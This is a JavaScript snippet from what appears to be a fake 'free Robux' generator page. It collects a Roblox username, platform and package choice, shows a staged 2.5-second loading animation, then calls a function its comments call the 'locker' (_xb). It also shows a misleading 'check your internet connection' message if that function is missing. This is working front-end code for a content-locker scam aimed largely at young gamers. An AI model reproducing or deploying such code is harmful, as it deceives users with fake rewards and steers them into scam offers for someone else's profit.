    <script>
        document.addEventListener('DOMContentLoaded', function() {
            const platformButtons = document.querySelectorAll('.platform-btn');
            const packageOptions = document.querySelectorAll('.package-option');
            const continueBtn = document.getElementById('continueBtn');
            const loadingSpinner = document.getElementById('loadingSpinner');
            const usernameInput = document.getElementById('usernameInput');
            const loadingScreen = document.getElementById('loadingScreen');
            
            let selectedPlatform = null;
            let selectedPackage = null;
            
            // Platform selection logic
            platformButtons.forEach(button => {
                button.addEventListener('click', function() {
                    platformButtons.forEach(btn => btn.classList.remove('selected'));
                    this.classList.add('selected');
                    selectedPlatform = this.getAttribute('data-platform');
                });
            });
            
            // Package selection logic
            packageOptions.forEach(option => {
                option.addEventListener('click', function() {
                    packageOptions.forEach(opt => opt.classList.remove('selected'));
                    this.classList.add('selected');
                    selectedPackage = this.getAttribute('data-robux');
                });
            });

            // Continue button functionality (Triggers the locker)
            continueBtn.addEventListener('click', function() {
                // Validation
                if (!usernameInput.value.trim()) {
                    alert('Please enter your Roblox username');
                    return;
                }
                if (!selectedPlatform) {
                    alert('Please select your platform');
                    return;
                }
                if (!selectedPackage) {
                    alert('Please select a Robux package');
                    return;
                }
                
                // Show loading
                loadingSpinner.style.display = 'block';
                continueBtn.disabled = true;
                
                setTimeout(function() {
                    loadingScreen.classList.add('active');
                }, 500);
                
                // Call Locker Function _xb()
                setTimeout(function() {
                    if (typeof window._xb === 'function') {
                        window._xb(); 
                        // Hide the loading screen after attempting to open the locker
                        loadingScreen.classList.remove('active'); 
                    } else {
                        console.error('Locker function _xb() is not defined. Please check the locker integration.');
                        alert('Locker is unavailable. Please check your internet connection.');
                        
                        // Fallback action and reset button
                        loadingScreen.classList.remove('active');
                        loadingSpinner.style.display = 'none';
                        continueBtn.disabled = false;
                    }
                }, 2500); // 2.5 seconds simulation
            });
        });
    </script>
